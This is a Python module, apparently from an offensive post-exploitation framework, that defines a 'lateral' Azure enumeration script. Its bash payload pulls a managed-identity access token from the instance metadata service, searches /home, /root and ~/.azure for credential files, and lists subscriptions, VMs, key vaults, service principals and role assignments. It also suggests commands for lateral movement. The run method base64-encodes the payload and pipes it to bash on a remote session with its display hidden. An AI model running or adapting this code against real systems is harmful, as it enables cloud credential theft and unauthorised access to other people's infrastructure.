"""Azure subscription enumeration script."""

from ..base import OperatorScript, ScriptResult


class AzureSubscription(OperatorScript):
    """Enumerate Azure subscriptions and managed identities."""
    
    name = "Azure Subscription Access"
    description = "Enumerate Azure subscriptions and managed identities"
    category = "lateral"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] AZURE SUBSCRIPTION ENUMERATION"
echo "=================================="
echo ""

if ! command -v az &>/dev/null; then
    echo "[-] Azure CLI not installed"
    exit 0
fi

echo "[+] Current Azure identity:"
az account show 2>/dev/null || echo "[-] Not authenticated"
echo ""

echo "[+] Available subscriptions:"
az account list --output table 2>/dev/null || echo "[-] Cannot list subscriptions"
echo ""

echo "[+] Checking for managed identity:"
echo "[*] Attempting to get access token from metadata service..."
TOKEN=$(curl -s -H "Metadata:true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
    2>/dev/null)

if [ ! -z "$TOKEN" ] && echo "$TOKEN" | grep -q "access_token"; then
    echo "[+] Managed identity token obtained!"
    echo "$TOKEN" | grep -o '"access_token":"[^"]*"' | cut -d'"' -f4 | head -c 50
    echo "..."
    
    echo ""
    echo "[*] Using managed identity to query resources:"
    az login --identity 2>/dev/null && \
        echo "[+] Successfully logged in with managed identity"
else
    echo "[-] No managed identity available"
fi
echo ""

echo "[+] Resource groups:"
az group list --query '[].name' --output table 2>/dev/null | head -20
echo ""

echo "[+] Virtual machines:"
az vm list --query '[].{Name:name, ResourceGroup:resourceGroup}' --output table 2>/dev/null | head -10
echo ""

echo "[+] Storage accounts:"
az storage account list --query '[].name' --output table 2>/dev/null | head -10
echo ""

echo "[+] Key vaults:"
az keyvault list --query '[].name' --output table 2>/dev/null | head -10
echo ""

echo "[+] Service principals:"
az ad sp list --query '[].{Name:displayName, AppId:appId}' --output table 2>/dev/null | head -10
echo ""

echo "[+] Role assignments for current identity:"
az role assignment list --assignee $(az account show --query user.name -o tsv) 2>/dev/null | \
    grep -E "roleDefinitionName|scope" | head -20
echo ""

echo "[+] Searching for Azure credentials:"
find /home /root -name "*azure*" -o -name "*.publishsettings" 2>/dev/null | while read file; do
    echo "[!] Found: $file"
    ls -la "$file"
done
echo ""

echo "[+] Azure credential files:"
ls -la ~/.azure/ 2>/dev/null
echo ""

echo "[+] Commands for lateral movement:"
echo "  az account set --subscription SUBSCRIPTION_ID"
echo "  az login --identity (use managed identity)"
echo "  az login --service-principal -u APP_ID -p PASSWORD --tenant TENANT_ID"
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Enumerating Azure subscriptions...[/bold cyan]")
            
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            
            return ScriptResult(
                success=True,
                output="Azure subscription enumeration executed",
                metadata={"script": "azure_subscription"}
            )
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
